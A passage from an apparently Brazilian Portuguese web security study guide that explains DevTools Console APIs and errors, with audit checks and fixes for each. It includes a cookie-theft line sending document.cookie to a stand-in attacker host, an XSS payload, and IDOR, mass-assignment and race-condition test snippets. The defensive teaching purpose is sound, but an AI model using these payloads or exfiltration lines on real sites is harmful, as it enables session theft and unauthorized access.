   // Inspecionar estados globais de hidratação (SSR / SPA) e configurações expostas em window:
   Object.keys(window).filter(k =>
     /^(app|config|env|user|auth|initial|__NEXT_DATA__|__NUXT__|__REDUX)/i.test(k)
   );
   ```
6. **Comportamento normal**: Retorna o objeto `Window` do contexto atual com centenas de APIs nativas da Web Platform e eventuais objetos globais criados pela aplicação.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Manter o namespace `window` limpo de variáveis de negócio, validar `event.origin` em comunicações via `window.postMessage`, garantir que `window.opener` seja `null` ao abrir links externos e evitar o armazenamento de segredos em objetos de hidratação SSR (*Server-Side Rendering* — renderização no servidor, como `window.__NEXT_DATA__` ou `window.__INITIAL_STATE__`).
8. **O que poderia indicar uma vulnerabilidade**:
   - **Vazamento em estado de hidratação (`window.__NEXT_DATA__`, `window.__NUXT__`, `window.__INITIAL_STATE__`)**: em aplicações SSR, o servidor frequentemente serializa todo o objeto do banco de dados no HTML dentro de uma variável global em `window`. Inspecionar `window.__NEXT_DATA__.props` no Console muitas vezes revela dados sensíveis que não aparecem visualmente na página, mas foram enviados pelo servidor!
   - **Poluição de Protótipo (*Prototype Pollution*) e DOM Clobbering**: se a aplicação lê configurações de `window.CONFIG` sem verificar se o objeto é legítimo, um atacante que injete HTML (`<a id="CONFIG" href="...">`) pode sobrescrever propriedades globais de `window` (*DOM Clobbering*).
   - **`window.opener` não nulo em links externos**: se uma página abre um link externo sem `rel="noopener"`, a página aberta ganha acesso a `window.opener.location` e pode redirecionar a aba original para uma página de phishing (*Reverse Tabnabbing* — nota: navegadores modernos aplicam `noopener` implicitamente em `target="_blank"`, mas chamadas via `window.open()` ainda exigem cuidado).
9. **Como investigar o problema**: Execute no Console a busca por chaves em `window` demonstrada no exemplo prático, inspecione o conteúdo completo de objetos como `window.__NEXT_DATA__` ou `window.__INITIAL_STATE__`, e verifique o status de isolamento da janela com `window.crossOriginIsolated` e `window.isSecureContext`.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Sanitize e filtre os objetos passados pelas funções de servidor (`getServerSideProps`, *loaders*) antes de serializá-los no HTML para hidratação em `window`; passe `"noopener,noreferrer"` ao usar `window.open(url, "_blank", "noopener,noreferrer")`; e encapsule variáveis de script em módulos ES (`<script type="module">`).

##### `document.cookie`

1. **Nome do parâmetro**: **`document.cookie`** (Interface JavaScript de leitura e escrita de cookies não-*HttpOnly*).
2. **O que significa**: É uma propriedade especial (*getter* e *setter*) do objeto `document` que retorna uma única string contendo os pares `nome=valor` separados por ponto e vírgula (`; `) de todos os cookies válidos para o domínio e caminho atuais que **não** possuem o atributo de segurança `HttpOnly`. Quando atribuída (`document.cookie = "tema=escuro; Secure; SameSite=Lax"`), ela adiciona ou atualiza aquele cookie específico (sem apagar os demais!).
3. **Para que serve**: No REPL do Console, é o teste definitivo e imediato para verificar **quais cookies da aplicação estão expostos à leitura por scripts JavaScript** (e, consequentemente, vulneráveis a roubo direto caso ocorra um ataque de XSS).
4. **Onde encontrar no DevTools**: Digitando `document.cookie` no prompt `>` da aba **Console** (e comparando o retorno com a lista completa de cookies visível na aba [Application > Cookies](./02b-devtools-application.md#s2-2-5)).
5. **Exemplo prático**:
   ```javascript
   // Executado no REPL do Console em uma sessão autenticada:
   > document.cookie
   <- "preferencia_idioma=pt-BR; tema_ui=dark"
   ```
   Ao comparar com a aba *Application > Cookies*, o analista vê que existe também o cookie ` __Host-sessao_id=a9f8e7...`, mas como ele possui a flag **`HttpOnly`** marcada, ele **não aparece** em `document.cookie`!
6. **Comportamento normal**: Retorna uma string com os cookies acessíveis ao cliente (ou uma string vazia `""` se todos os cookies forem `HttpOnly` ou se não houver cookies). Note que `document.cookie` exibe apenas `nome=valor`, omitindo metadados como `Expires`, `Domain`, `Path` e `SameSite`.
7. **O que seria considerado seguro**: **`[REQUISITO]`** O retorno de `document.cookie` no Console **jamais** deve conter identificadores de sessão (`PHPSESSID`, `JSESSIONID`, `connect.sid`, `session_id`), tokens de acesso (`access_token`, JWT), *refresh tokens* ou dados pessoais sensíveis. Apenas cookies estritamente funcionais de interface (como idioma ou tema) ou tokens anti-CSRF do padrão *Double Submit Cookie* devem ser legíveis por `document.cookie`.
8. **O que poderia indicar uma vulnerabilidade**:
   - **Cookie de sessão visível em `document.cookie`**: se ao digitar `document.cookie` no Console você enxergar o token de autenticação ou ID de sessão da sua conta, significa que o servidor esqueceu de definir a flag **`HttpOnly`** no cabeçalho `Set-Cookie`. Qualquer vulnerabilidade XSS na aplicação permitirá ao atacante roubar a sessão instantaneamente com `fetch('https://atacante.test/?c=' + encodeURIComponent(document.cookie))`.
   - **Sobrescrita ou *Cookie Tossing***: um script também pode gravar cookies via `document.cookie = ...` para tentar fixar valores caso o servidor não utilize o prefixo seguro `__Host-`.
9. **Como investigar o problema**: Faça login na aplicação, abra a aba **Console** e digite `document.cookie.split('; ')`. Em seguida, abra a aba **Application > Storage > Cookies** e compare os dois conjuntos: qualquer cookie sensível presente na aba *Application* que também tenha aparecido na saída de `document.cookie` está sem a proteção `HttpOnly`.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Configure todos os cookies de autenticação e sessão no servidor com os atributos `HttpOnly; Secure; SameSite=Lax` (ou `Strict`) e utilize preferencialmente o prefixo `__Host-` (ex.: `Set-Cookie: __Host-session=...; Path=/; Secure; HttpOnly; SameSite=Lax`), que impede a leitura e a sobrescrita via `document.cookie`.

##### `localStorage`

1. **Nome do parâmetro**: **`localStorage`** / **`window.localStorage`** (Armazenamento web persistente por origem).
2. **O que significa**: É uma API síncrona de armazenamento chave-valor (*Web Storage API*) que persiste dados em formato de string no navegador do usuário vinculados à **origem** (`esquema + host + porta`, respeitando a *Same-Origin Policy*), **sem data de expiração** automática — os dados permanecem gravados mesmo após fechar a aba, fechar o navegador ou reiniciar o computador.
3. **Para que serve**: Serve para salvar no cliente estados não sensíveis e preferências duradouras de interface (como tema claro/escuro, estado de recolhimento da barra lateral, rascunhos públicos ou cache de configurações de UI). Seus métodos são `getItem(k)`, `setItem(k, v)`, `removeItem(k)`, `clear()` e `key(i)`.
4. **Onde encontrar no DevTools**: Digitando `localStorage` no prompt `>` da aba **Console** (ou inspecionando visualmente em [Application > Storage > Local Storage](./02b-devtools-application.md#s2-2-3)).
5. **Exemplo prático**:
   ```javascript
   // No REPL do Console, listar todas as chaves e valores salvos no localStorage em formato de tabela:
   console.table(
     Object.entries(localStorage).map(([chave, valor]) => ({
       chave,
       tamanhoBytes: valor.length,
       amostra: valor.slice(0, 80)
     }))
   );
   ```
6. **Comportamento normal**: Retorna um objeto `Storage` contendo todos os pares de strings gravados pela origem atual (normalmente com limite de ~5 MB por origem).
7. **O que seria considerado seguro**: **`[REQUISITO]`** O `localStorage` deve conter **apenas dados não sensíveis** (preferências visuais, flags de onboarding, idioma). Nenhum segredo, senha, token de sessão de longa duração, *refresh token* ou PII deve ser persistido ali.
8. **O que poderia indicar uma vulnerabilidade**:
   - **Armazenamento de JWT, `access_token`, `refresh_token` ou chaves de API no `localStorage`**: diferentemente dos cookies `HttpOnly`, o `localStorage` é **100% acessível por qualquer código JavaScript** que rode na mesma origem. Se houver um único ponto de XSS na aplicação ou se um pacote NPM (*Node Package Manager*) de terceiros for comprometido, uma única linha de código (`JSON.stringify(localStorage)`) exfiltra todos os tokens salvos! Além disso, como o `localStorage` não expira ao fechar o navegador, tokens esquecidos em computadores compartilhados (laboratórios, bibliotecas, lan houses) permanecem acessíveis para o próximo usuário da máquina.
9. **Como investigar o problema**: Execute `console.table(Object.entries(localStorage))` no Console após o login. Se encontrar valores que começam com `eyJ` (cabeçalho Base64URL típico de um JWT `{"alg":...}`), decodifique o payload diretamente no Console com:
   ```javascript
   JSON.parse(atob(localStorage.getItem("token").split(".")[1].replace(/-/g, "+").replace(/_/g, "/")));
   ```
   Verifique o tempo de expiração (`exp`) e quais dados estão dentro do token, e teste se o comando de *Logout* da aplicação remove efetivamente essas chaves do `localStorage`.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Migre o armazenamento de tokens de sessão e *refresh tokens* para **cookies `HttpOnly; Secure; SameSite`** gerenciados pelo servidor (padrão BFF — *Backend For Frontend*, ou sessão via cookie seguro). Se uma SPA precisar manter um `access_token` de curtíssima duração no cliente, mantenha-o apenas em **memória volátil JavaScript** (variável privada de módulo/closure), nunca em `localStorage`.

##### `sessionStorage`

1. **Nome do parâmetro**: **`sessionStorage`** / **`window.sessionStorage`** (Armazenamento web por sessão de aba e origem).
2. **O que significa**: É a segunda interface da *Web Storage API*, idêntica em métodos ao `localStorage` (`getItem`, `setItem`, `removeItem`, `clear`), mas com escopo e tempo de vida restritos à **sessão da aba atual (*top-level browsing context*)**: os dados são isolados por aba e são apagados automaticamente assim que a aba ou janela do navegador é fechada (sobrevivendo apenas a recarregamentos `F5` e restaurações da mesma aba).
3. **Para que serve**: Serve para armazenar estados temporários de navegação de uma aba específica (como o passo atual de um formulário *wizard* de várias etapas, filtros de busca aplicados naquela aba ou posição de rolagem), evitando que duas abas abertas no mesmo site interfiram no estado uma da outra.
4. **Onde encontrar no DevTools**: Digitando `sessionStorage` no prompt `>` da aba **Console** (ou na aba [Application > Storage > Session Storage](./02b-devtools-application.md#s2-2-3)).
5. **Exemplo prático**:
   ```javascript
   // Inspecionar todo o conteúdo do sessionStorage da aba atual no Console:
   console.table(Object.entries(sessionStorage));
   ```
6. **Comportamento normal**: Retorna um objeto `Storage` contendo os pares chave-valor vinculados exclusivamente à origem e à aba atual.
7. **O que seria considerado seguro**: **`[RECOMENDAÇÃO]`** Usar `sessionStorage` para estados transitórios de UI não críticos, garantindo que informações altamente confidenciais (como senhas em texto claro, CVV de cartão de crédito ou *refresh tokens*) nunca sejam salvas nele.
8. **O que poderia indicar uma vulnerabilidade**:
   - **Mito da imunidade a XSS**: muitos desenvolvedores mudam tokens do `localStorage` para o `sessionStorage` achando que isso resolve o problema de XSS. Embora o `sessionStorage` reduza o risco de persistência em disco após o fechamento da aba, **enquanto a aba estiver aberta ele continua 100% legível por qualquer script via XSS** (`sessionStorage.getItem('token')`)!
   - **Armazenamento de senhas ou dados de cartão entre etapas de um formulário**: formulários de cadastro ou checkout mal projetados às vezes salvam a senha digitada ou o número do cartão em `sessionStorage.setItem('step1_data', ...)` para ler na etapa seguinte, expondo credenciais em texto puro ao DOM.
9. **Como investigar o problema**: Enquanto avança pelas etapas de formulários multi-passos (*wizards* de cadastro, recuperação de conta ou checkout), monitore `Object.entries(sessionStorage)` no Console (ou fixe uma *Live Expression* `JSON.stringify(sessionStorage)`) para observar se credenciais, tokens ou dados financeiros são gravados temporariamente.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Nunca persista senhas ou dados de cartão (PAN — *Primary Account Number*, ou CVV — *Card Verification Value*) em `sessionStorage`. Mantenha estados transitórios apenas em memória de componentes e utilize cookies `HttpOnly` para gestão de sessão.

##### `fetch()`

1. **Nome do parâmetro**: **`fetch(resource [, options])`** (API moderna de requisições HTTP assíncronas).
2. **O que significa**: É a API nativa e baseada em *Promises* dos navegadores modernos (padronizada no *Fetch Standard* do WHATWG) para disparar requisições HTTP/HTTPS assíncronas a partir do JavaScript, substituindo o legado `XMLHttpRequest`.
3. **Para que serve**: Na aplicação, serve para consumir APIs REST, GraphQL e carregar recursos dinamicamente. No REPL do Console, é uma das ferramentas mais poderosas do auditor de segurança: permite **forjar, repetir e testar requisições HTTP personalizadas** diretamente do contexto autenticado do navegador para verificar controles de autorização (IDOR/BOLA — *Insecure Direct Object Reference / Broken Object Level Authorization*), validação no servidor, métodos HTTP (`PUT`, `DELETE`, `PATCH`), cabeçalhos e políticas de CORS.
4. **Onde encontrar no DevTools**: Executável diretamente no prompt `>` da aba **Console**. Além disso, na aba **Network**, você pode clicar com o botão direito em qualquer requisição capturada e escolher **Copy > Copy as fetch** para colar e editar a chamada completa no Console!
5. **Exemplo prático**:
   Em um teste autorizado de controle de acesso no REPL do Console, o auditor logado como usuário `id: 105` testa se a API no back-end permite alterar o perfil de outro usuário (`id: 101`) ou atribuir a si mesmo o papel de administrador (*Mass Assignment* / *BOLA*):
   ```javascript
   // Testando autorização e validação do back-end diretamente pelo REPL do Console:
   const resposta = await fetch("/api/v1/usuarios/105", {
     method: "PATCH",
     headers: { "Content-Type": "application/json" },
     credentials: "include", // Envia os cookies (inclusive HttpOnly!) da sessão atual
     body: JSON.stringify({ nome: "Teste Auditoria", role: "admin" })
   });
   console.log("Status HTTP:", resposta.status);
   console.log("Corpo do retorno:", await resposta.json());
   ```
6. **Comportamento normal**: Retorna imediatamente uma `Promise` que resolve para um objeto `Response` assim que os cabeçalhos HTTP de resposta chegam do servidor. Importante: **`fetch()` não rejeita a Promise em códigos de erro HTTP como `404` ou `500`** (apenas define `response.ok = false`); a Promise só é rejeitada em falhas de rede, DNS, TLS ou bloqueio de CORS/CSP.
7. **O que seria considerado seguro**: **`[REQUISITO]`** Quando um usuário manipula parâmetros, métodos HTTP, IDs de recursos ou campos JSON usando `fetch()` no Console, o servidor deve validar rigorosamente a sessão, as permissões de acesso ao objeto solicitado (`403 Forbidden` se tentar acessar dados de terceiros) e o esquema (*schema*) dos campos permitidos (`400 Bad Request` / `422 Unprocessable Content`).
8. **O que poderia indicar uma vulnerabilidade**:
   - Se o teste com `fetch()` no Console retornar `200 OK` ao consultar `/api/v1/faturas/101` (pertencente a outro cliente), está confirmada uma vulnerabilidade crítica de **IDOR / BOLA**.
   - Se o envio de `"role": "admin"` no corpo do `fetch()` atualizar o nível de permissão do usuário, está confirmada uma vulnerabilidade de **Mass Assignment** (*Atribuição em Massa*).
   - No código da aplicação, usar `fetch(url, { credentials: 'include' })` para domínios de terceiros não confiáveis ou interpolar entradas do usuário diretamente na URL do `fetch()` sem validação pode causar vazamento de credenciais ou SSRF no cliente (*Client-Side Path Traversal / Request Forgery*).
9. **Como investigar o problema**: Na aba **Network**, localize uma requisição de API relevante, clique com o botão direito e selecione **Copy > Copy as fetch**. Cole no **Console**, modifique os parâmetros (IDs na URL, campos no `body`, método HTTP de `GET` para `DELETE` ou `PUT`), pressione `Enter` e inspecione o status e o JSON retornado pelo servidor.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Implemente verificação de propriedade do recurso (*ownership check*) e controle de acesso baseado em papéis/atributos (RBAC/ABAC) em **todos** os endpoints do back-end, use listas de permissão (*allowlists*) de campos aceitos no *body* da requisição e restrinja os domínios permitidos para `fetch()` via diretiva `connect-src` do cabeçalho CSP.

##### `Promise`

1. **Nome do parâmetro**: **`Promise`** (Objeto nativo de computação assíncrona).
2. **O que significa**: Uma `Promise` (Promessa) é um objeto JavaScript que representa a conclusão eventual (ou falha) de uma operação assíncrona e seu valor resultante. Uma Promise encontra-se sempre em um de três estados internos (`[[PromiseState]]`):
   - **`pending` (pendente)**: estado inicial; a operação ainda está em andamento.
   - **`fulfilled` (realizada/resolvida)**: a operação concluiu com sucesso e possui um valor resultante (`[[PromiseResult]]`).
   - **`rejected` (rejeitada)**: a operação falhou e possui um motivo/erro de rejeição (`[[PromiseResult]]`).
3. **Para que serve**: Serve para encadear operações assíncronas (como chamadas de rede `fetch()`, criptografia via `crypto.subtle`, leitura de arquivos ou transações `IndexedDB`) usando `.then()`, `.catch()` e `.finally()`, ou combinando múltiplas operações com `Promise.all()`, `Promise.allSettled()`, `Promise.race()` e `Promise.any()`.
4. **Onde encontrar no DevTools**: Ao avaliar qualquer função assíncrona no prompt da aba **Console** sem `await`, o Console imprime imediatamente o objeto `Promise {<pending>}`, `Promise {<fulfilled>: valor}` ou `Promise {<rejected>: erro}`, que pode ser expandido clicando na seta `▶` para inspecionar `[[PromiseState]]` e `[[PromiseResult]]`.
5. **Exemplo prático**:
   ```javascript
   // Disparando 5 requisições simultâneas no REPL com Promise.all para testar Race Condition (Condição de Corrida):
   const tentativas = Array.from({ length: 5 }, () =>
     fetch("/api/v1/cupom/resgatar", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ codigo: "BEMVINDO50" })
     }).then(r => r.status)
   );
   Promise.all(tentativas).then(statusCodes => console.table(statusCodes));
   ```
6. **Comportamento normal**: Uma Promise pendente resolve ou rejeita de forma assíncrona na fila de microtarefas (*microtask queue*) do Event Loop. Se uma Promise for rejeitada e não houver nenhum bloco `.catch()` anexado a ela, o navegador emite um erro vermelho `Uncaught (in promise)` no Console.
7. **O que seria considerado seguro**: **`[REQUISITO]`** Tratar todas as rejeições de Promises com `.catch()` (ou `try...catch` com `await`) e garantir que o back-end utilize bloqueios transacionais (*locks* atômicos no banco de dados) para resistir a requisições concorrentes disparadas via `Promise.all()`.
8. **O que poderia indicar uma vulnerabilidade**:
   - **Vulnerabilidade a Condições de Corrida (TOCTOU — *Time-of-Check to Time-of-Use*)**: no exemplo acima, se ao disparar 5 Promises simultâneas com `Promise.all()` no Console para resgatar um cupom de uso único ou realizar um saque, o servidor retornar `200 OK` para duas ou mais requisições antes de atualizar o saldo no banco, há uma falha grave de **Race Condition** (veja a [Seção 3.18](./03b-vulnerabilidades-parte2.md#s3-18)).
   - **Promises rejeitadas sem tratamento (`Unhandled Promise Rejection`)**: podem deixar a interface em estado inconsistente (por exemplo, ignorar uma falha na renovação de sessão ou expor o motivo bruto do erro no Console).
9. **Como investigar o problema**: Observe no Console se surgem mensagens `Uncaught (in promise)`. Expanda o objeto `Promise` no Console para ver o `[[PromiseResult]]`. Em testes autorizados de lógica de negócios (cupons, transferências, votos, limites de uso), utilize `Promise.all()` no REPL para enviar um lote concorrente de requisições e verificar se apenas uma é aceita pelo servidor.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Sempre anexe tratadores de erro `.catch()` às cadeias de Promises no cliente, e no servidor proteja operações críticas de escrita contra concorrência utilizando transações com nível de isolamento adequado (`SERIALIZABLE` / `REPEATABLE READ`), `SELECT ... FOR UPDATE` ou restrições de unicidade (*unique constraints*) no banco de dados.

##### `Async/Await`

1. **Nome do parâmetro**: **`async` / `await`** (Sintaxe de funções assíncronas e **Top-Level Await** no REPL do Console).
2. **O que significa**: `async` e `await` são palavras-chave do JavaScript moderno construídas sobre *Promises* que permitem escrever código assíncrono com leitura e fluxo sequencial (como se fosse síncrono). No REPL do Chrome DevTools, há um recurso especial extremamente conveniente: o suporte nativo a **Top-Level `await`** — você pode usar a palavra-chave `await` diretamente na linha de comando do Console sem precisar envolvê-la dentro de uma função `async function() { ... }()`!
3. **Para que serve**: Serve para aguardar a resolução de Promises diretamente no prompt do Console (como `const dados = await (await fetch('/api/status')).json()`) e para estruturar fluxos assíncronos claros com tratamento de exceções unificado via `try...catch`.
4. **Onde encontrar no DevTools**: Diretamente no prompt `>` da aba **Console** ou nos scripts inspecionados na aba *Sources*.
5. **Exemplo prático**:
   No REPL do Console, usando *Top-Level `await`* para encadear a busca de uma resposta HTTP e a leitura do seu corpo JSON em duas linhas simples:
   ```javascript
   // Executado diretamente no prompt do Console (Top-Level Await):
   const resp = await fetch("/api/v1/configuracoes-publicas");
   const config = await resp.json();
   console.table(config);
   ```
6. **Comportamento normal**: Quando você executa uma expressão com `await` no prompt do Console, o prompt aguarda a conclusão da Promise e imprime diretamente o valor resolvido (em vez de imprimir `Promise {<pending>}`). Caso a Promise seja rejeitada, o `await` converte a rejeição em uma exceção lançada (`Uncaught ...`), que pode ser capturada com `try { await ... } catch (e) { ... }`.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Envolver chamadas `await` em blocos `try...catch` no código da aplicação, garantindo que o fluxo de execução seguinte só ocorra se a promessa anterior tiver sido resolvida e validada com sucesso.
8. **O que poderia indicar uma vulnerabilidade**:
   - **Esquecimento do `await` em verificações assíncronas de segurança**: um erro clássico e perigoso em JavaScript é chamar uma função `async` que retorna `Promise<boolean>` dentro de um `if` **esquecendo a palavra `await`**:
     ```javascript
     // BUG CRÍTICO: uma função async SEMPRE retorna um objeto Promise (que é truthy em JS!)
     async function usuarioTemPermissao() { return false; }
     if (usuarioTemPermissao()) { // Falta o 'await'! O objeto Promise é avaliado como TRUE!
       liberarAcessoPainel();
     }
     ```
     Como qualquer objeto (incluindo uma `Promise {<pending>}` ou `Promise {<fulfilled>: false}`) é considerado *truthy* (verdadeiro) em uma condição `if (promessa)` em JavaScript, esquecer o `await` faz a condição passar **sempre como verdadeira**, burlando a verificação!
9. **Como investigar o problema**: Ao revisar scripts de autenticação, validação de formulários ou guardiões de rota no DevTools, verifique se funções declaradas como `async` estão sendo chamadas com `await` antes que seu resultado booleano seja avaliado em condicionais `if`.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Utilize regras de análise estática como `@typescript-eslint/no-floating-promises` e `@typescript-eslint/no-misused-promises` para detectar em tempo de compilação qualquer função `async` cujo `await` tenha sido esquecido em condicionais `if` ou `while`.

##### Utilitários do Console (`$0`, `$_`, `$()`, `$$()`, `copy()`, `getEventListeners()`)

1. **Nome do parâmetro**: **Console Utilities API** (`$0` a `$4`, `$_`, `$()`, `$$()`, `$x()`, `copy()`, `getEventListeners()`, `monitorEvents()`, `queryObjects()`, `debug()`).
2. **O que significa**: É uma coleção de variáveis mágicas e funções auxiliares injetadas **exclusivamente no ambiente do REPL do Console do DevTools**. Elas não existem no JavaScript normal da página (se um script da aplicação tentar chamar `getEventListeners(window)` ou `copy(dados)`, lançará `ReferenceError`), mas estão sempre disponíveis para o desenvolvedor ou auditor que digita comandos no Console.
3. **Para que serve**: Serve para acelerar drasticamente a inspeção do DOM, a extração de dados para a área de transferência, a descoberta de ouvintes de eventos ocultos e o encadeamento de avaliações no REPL:
   - **`$_`**: retorna o valor da **última expressão avaliada** no Console.
   - **`$0`** (e `$1`, `$2`, `$3`, `$4`): retorna a referência direta para o **elemento do DOM atualmente selecionado** na aba *Elements* (`$1` é o penúltimo selecionado, até `$4`).
   - **`$(selector [, startNode])`**: atalho para `document.querySelector(selector)` (retorna o primeiro elemento correspondente). *Nota: se a página tiver uma biblioteca como jQuery definindo `window.$`, a variável da página tem precedência.*
   - **`$$(selector [, startNode])`**: atalho para `Array.from(document.querySelectorAll(selector))` — retorna diretamente um **Array real** (com `.map()`, `.filter()`, `.forEach()`) em vez de um `NodeList`!
   - **`$x(xpath [, startNode])`**: avalia uma expressão XPath e retorna um array com os nós correspondentes.
   - **`copy(object)`**: copia a representação em string (ou JSON formatado, se for um objeto/array) de qualquer valor diretamente para a **área de transferência (*clipboard*)** do sistema operacional.
   - **`getEventListeners(node)`**: retorna um objeto listando **todos os *event listeners* registrados** em um nó do DOM ou em `window`/`document` (como `click`, `submit`, `keydown`, `message`), mesmo aqueles registrados via `addEventListener` com funções anônimas que não aparecem no HTML!
   - **`monitorEvents(node [, events])` / `unmonitorEvents(node)`**: imprime no Console em tempo real todos os eventos disparados no elemento especificado.
   - **`monitor(fn)` / `unmonitor(fn)`**: imprime no Console toda vez que a função `fn` é chamada, mostrando os argumentos exatos passados a ela.
4. **Onde encontrar no DevTools**: Disponíveis exclusivamente ao digitar no prompt `>` da aba **Console** (e em expressões de *Logpoints* / *Conditional Breakpoints*).
5. **Exemplo prático**:
   Veja como combinar os utilitários do Console em uma auditoria de segurança real:
   ```javascript
   // 1. Encontrar todos os inputs da página com $$(), extrair seus nomes/valores e copiar o JSON para a área de transferência:
   copy($$("input, select, textarea").map(el => ({ name: el.name, type: el.type, value: el.value })));

   // 2. Descobrir se existe algum keylogger ouvindo eventos de teclado (keydown/keyup/keypress) no document ou window:
   getEventListeners(document);
   getEventListeners(window);

   // 3. Inspecionar quem está ouvindo mensagens cross-origin (postMessage) na janela:
   getEventListeners(window).message;
   // Dica: clique direito em listener[0].listener -> "Show function definition" para abrir o código exato na aba Sources!

   // 4. Desabilitar a validação HTML5 do formulário atualmente selecionado na aba Elements ($0):
   $0.form.noValidate = true;
   ```
6. **Comportamento normal**: Funcionam instantaneamente quando digitados no prompt do Console (desde que a página não tenha sobrescrito nomes como `$` no objeto `window`).
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Para o auditor, usar `getEventListeners(window)` e `getEventListeners(document)` é uma das maneiras mais rápidas e precisas de mapear a superfície de ataque de eventos no cliente (como *listeners* de `message`, `keydown`, `paste` e `submit`).
8. **O que poderia indicar uma vulnerabilidade**:
   - Ao executar **`getEventListeners(window).message`**, clicar na função listada (`listener: ƒ (e)`) para abri-la na aba *Sources* e verificar que ela processa `e.data` (por exemplo, passando para `eval()`, `innerHTML` ou `location.href`) **sem verificar `e.origin`**, você acabou de encontrar uma vulnerabilidade clássica de **DOM XSS / Open Redirect via `postMessage`**!
   - Ao executar **`getEventListeners(document).keydown`** ou **`getEventListeners(inputSenha)`** e descobrir um *listener* apontando para um script externo de terceiros enviando cada tecla digitada para um servidor remoto, fica caracterizada a captura maliciosa de digitação (*keylogging*).
9. **Como investigar o problema**:
   1. Abra o Console e execute `getEventListeners(window)` e `getEventListeners(document)`.
   2. Expanda os eventos sensíveis (`message`, `keydown`, `keypress`, `paste`, `submit`, `beforeunload`).
   3. Para cada item do array, expanda o objeto e clique no link `[[FunctionLocation]]: arquivo.js:linha` para ler a implementação da função na aba **Sources**.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Em todos os *listeners* de `window.addEventListener("message", handler)` identificados por `getEventListeners(window)`, exija validação estrita da origem remetente (`if (event.origin !== "https://origem-confiavel.test") return;`) antes de processar `event.data`.

---

<a id="s2-3-4"></a>
#### 2.3.4 Erros e exceções no Console

Quando uma instrução JavaScript viola as regras da linguagem, tenta operar sobre um tipo incompatível, falha na comunicação de rede ou esbarra em uma política de segurança do navegador, um objeto de erro (instância de `Error` ou de suas subclasses nativas, ou uma `DOMException`) é lançado e registrado na aba Console.

Em provas acadêmicas e auditorias de segurança (pentest web), saber interpretar cada tipo de erro no Console é essencial: muitas vezes, um `SyntaxError` inesperado é o primeiro sinal de uma **injeção de código (XSS)** bem-sucedida ou de um erro de `JSON.parse()` ao receber um HTML de erro do servidor, enquanto um `CSP violation` ou `CORS error` revela exatamente como as defesas do navegador estão configuradas.

A seguir, cada um dos nove erros e exceções fundamentais do Console é analisado detalhadamente segundo a ficha técnica de 10 pontos (incluindo sua causa técnica, exemplo prático e implicações de segurança).

##### `SyntaxError`

1. **Nome do parâmetro**: **`SyntaxError`** (Erro de sintaxe na análise léxica/gramatical do código ou JSON).
2. **O que significa**: É uma exceção lançada pelo motor JavaScript (V8) quando ele tenta analisar (*parse*) um trecho de código-fonte ou uma string JSON que viola as regras gramaticais da linguagem ECMAScript ou da especificação JSON (RFC 8259).
3. **Para que serve**: Indica imediatamente que um script carregado está malformado, que uma avaliação dinâmica (`eval()`, `new Function()`, `JSON.parse()`) recebeu tokens inválidos ou que o servidor devolveu uma página HTML (ex.: `<!DOCTYPE html>...`) quando o script esperava um documento JSON ou um arquivo `.js`.
4. **Onde encontrar no DevTools**: Na aba **Console**, sob o nível **Errors**, exibindo a mensagem `Uncaught SyntaxError: ...` e apontando para o arquivo, linha e coluna exatos do caractere inesperado.
5. **Exemplo prático**:
   Existem dois cenários clássicos de `SyntaxError` no Console:
   ```text
   # Cenário A: O servidor retornou uma página HTML de erro 500/404, mas o front-end tentou fazer JSON.parse():
   ❌ Uncaught (in promise) SyntaxError: Unexpected token '<', "<!DOCTYPE "... is not valid JSON

   # Cenário B: Entrada do usuário interpolada sem escape dentro de uma tag <script> no HTML:
   // Código gerado pelo servidor quando o usuário pesquisou por: sapato'; alert(1)//
   <script>
     const termoBusca = 'sapato'; // Se o usuário digitar apenas uma aspa simples: sapato'
   </script>
   // O Console exibe imediatamente:
   ❌ Uncaught SyntaxError: Invalid or unexpected token (busca.php:42:31)
   ```
6. **Comportamento normal**: Em um código compilado e testado, nenhum `SyntaxError` deve ocorrer em produção.
7. **O que seria considerado seguro**: **`[REQUISITO]`** Verificar o cabeçalho `Content-Type: application/json` e `response.ok` antes de chamar `response.json()`, e **jamais** concatenar strings vindas do usuário diretamente dentro de blocos `<script>` ou chamadas `eval()`.
8. **O que poderia indicar uma vulnerabilidade**:
   - **Indicador direto de XSS em contexto de script**: durante um teste autorizado, se você inserir uma aspa simples (`'`) ou dupla (`"`) ou barra invertida (`\`) em um parâmetro da URL ou formulário e observar um **`Uncaught SyntaxError: Unexpected token`** surgir no Console apontando para o documento HTML atual, isso prova que sua entrada foi refletida **dentro de um contexto de execução JavaScript sem codificação adequada**! Basta ajustar o payload para fechar a sintaxe corretamente (ex.: `'; alert(document.domain);//`) para alcançar a execução de código (XSS).
   - **Falha de MIME / Roteamento expondo estrutura**: o erro `Unexpected token '<'` ao carregar um script `.js` pode indicar que um arquivo JavaScript (ou *chunk* antigo) não foi encontrado e o servidor devolveu um fallback HTML.
9. **Como investigar o problema**: Clique no link `arquivo:linha:coluna` à direita do `SyntaxError` no Console. Na aba **Sources**, observe a linha marcada com um sublinhado ondulado vermelho: verifique se há dados controlados pelo usuário misturados ao código JavaScript ou se o conteúdo do arquivo na verdade é um documento HTML retornado por engano pelo servidor.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Para passar dados do servidor para o JavaScript do cliente com segurança, nunca concatene variáveis diretamente em strings de código JS; serialize os dados com segurança em um elemento `<script type="application/json" id="dados-iniciais">` (escapando `<`, `>`, `&`) e leia com `JSON.parse(document.getElementById('dados-iniciais').textContent)`, ou busque os dados via endpoint JSON dedicado verificando `response.ok`.

##### `ReferenceError`

1. **Nome do parâmetro**: **`ReferenceError`** (Erro de referência a identificador inexistente ou não inicializado).
2. **O que significa**: É a exceção lançada quando o código tenta ler o valor de uma variável ou função que **não foi declarada** em nenhum escopo acessível, ou quando tenta acessar uma variável declarada com `let` ou `const` antes da linha de sua inicialização (na chamada **TDZ — *Temporal Dead Zone***, ou Zona Morta Temporal).
